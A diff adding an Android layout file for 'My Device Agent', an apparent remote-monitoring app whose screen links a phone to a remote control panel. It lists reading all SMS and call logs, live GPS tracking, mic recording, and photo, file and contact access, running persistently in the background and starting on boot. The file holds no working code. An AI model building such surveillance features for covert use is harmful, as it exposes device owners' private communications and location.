@@ -1,0 +1,172 @@
+<?xml version="1.0" encoding="utf-8"?>
+<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="#0a0e17">
+
+    <LinearLayout
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:orientation="vertical"
+        android:padding="24dp">
+
+        <!-- Logo & Title -->
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="📱"
+            android:textSize="64sp"
+            android:gravity="center"
+            android:layout_marginTop="32dp" />
+
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="My Device Agent"
+            android:textColor="#f0f4ff"
+            android:textSize="28sp"
+            android:textStyle="bold"
+            android:gravity="center"
+            android:layout_marginTop="8dp" />
+
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="Remote Control Panel se connect karein"
+            android:textColor="#94a3b8"
+            android:textSize="14sp"
+            android:gravity="center"
+            android:layout_marginTop="8dp" />
+
+        <!-- Status -->
+        <TextView
+            android:id="@+id/tvStatus"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="Status: Not Connected"
+            android:textColor="#ef4444"
+            android:textSize="16sp"
+            android:textStyle="bold"
+            android:gravity="center"
+            android:layout_marginTop="24dp"
+            android:padding="12dp"
+            android:background="@drawable/status_bg" />
+
+        <!-- Server URL -->
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="Server URL"
+            android:textColor="#94a3b8"
+            android:textSize="13sp"
+            android:layout_marginTop="24dp" />
+
+        <EditText
+            android:id="@+id/etServerUrl"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:hint="https://my-device-control-panel.onrender.com"
+            android:textColor="#f0f4ff"
+            android:textColorHint="#475569"
+            android:background="@drawable/input_bg"
+            android:padding="16dp"
+            android:textSize="15sp"
+            android:inputType="textUri"
+            android:layout_marginTop="8dp" />
+
+        <!-- Device Name -->
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="Device Name"
+            android:textColor="#94a3b8"
+            android:textSize="13sp"
+            android:layout_marginTop="16dp" />
+
+        <EditText
+            android:id="@+id/etDeviceName"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:hint="Mera Phone"
+            android:textColor="#f0f4ff"
+            android:textColorHint="#475569"
+            android:background="@drawable/input_bg"
+            android:padding="16dp"
+            android:textSize="15sp"
+            android:layout_marginTop="8dp" />
+
+        <!-- Permissions -->
+        <Button
+            android:id="@+id/btnPermissions"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="🔐  Grant All Permissions"
+            android:textSize="16sp"
+            android:textColor="#ffffff"
+            android:background="@drawable/btn_permissions"
+            android:padding="16dp"
+            android:layout_marginTop="24dp" />
+
+        <TextView
+            android:id="@+id/tvPermissionStatus"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="Permissions: checking..."
+            android:textColor="#f59e0b"
+            android:textSize="13sp"
+            android:gravity="center"
+            android:layout_marginTop="8dp" />
+
+        <!-- Connect Button -->
+        <Button
+            android:id="@+id/btnConnect"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="Connect &amp; Start"
+            android:textSize="18sp"
+            android:textStyle="bold"
+            android:textColor="#ffffff"
+            android:background="@drawable/btn_connect"
+            android:padding="18dp"
+            android:layout_marginTop="24dp" />
+
+        <!-- Info -->
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="vertical"
+            android:background="@drawable/card_bg"
+            android:padding="16dp"
+            android:layout_marginTop="24dp">
+
+            <TextView
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="ℹ️  Features (after permissions)"
+                android:textColor="#f0f4ff"
+                android:textSize="15sp"
+                android:textStyle="bold" />
+
+            <TextView
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="📞 Call Log - Real call history\n💬 SMS - All messages read\n📍 GPS - Live location tracking\n🖼️ Gallery - All photos access\n📁 Files - Full storage browse\n🎤 Audio - Mic recording\n👥 Contacts - All contacts\n🔋 Battery &amp; Device Info\n\n✅ Runs 24/7 in background\n✅ Auto-starts on boot\n✅ Works even when app is closed"
+                android:textColor="#94a3b8"
+                android:textSize="13sp"
+                android:lineSpacingExtra="4dp"
+                android:layout_marginTop="12dp" />
+
+        </LinearLayout>
+
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="App minimize karne ke baad bhi service chalti rahegi"
+            android:textColor="#475569"
+            android:textSize="12sp"
+            android:gravity="center"
+            android:layout_marginTop="16dp"
+            android:layout_marginBottom="32dp" />
+
+    </LinearLayout>
+</ScrollView>
